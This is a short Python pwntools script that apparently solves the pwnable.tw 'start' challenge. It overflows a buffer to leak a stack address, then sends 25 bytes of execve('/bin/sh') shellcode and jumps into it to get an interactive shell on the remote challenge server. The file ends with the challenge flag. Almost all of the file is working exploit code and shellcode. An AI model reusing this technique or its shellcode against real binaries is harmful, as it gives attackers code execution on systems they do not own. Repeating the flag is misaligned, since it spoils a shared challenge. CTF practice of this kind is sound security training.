from pwn import *
payload = ''.join([
    'A'*20,                      # offset
    p32(0x8048087),              # mov ecx, esp
])
#p = process('./start')
p = remote('chall.pwnable.tw', 10000)
p.sendafter(':', payload)        # send payload without newline
stack = u32(p.recv(20)[-20:-16]) # stack stack address for buffer
log.info('stack 0x%x'%stack)

# Name: 25 bytes execve("/bin/sh") shellcode
# http://shell-storm.org/shellcode/files/shellcode-585.php
shellcode = "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

payload = ''.join([
    '\x90'*20,
    p32(stack+20),               # jmp2stack
    shellcode,
])
p.send(payload)
p.interactive()

#FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}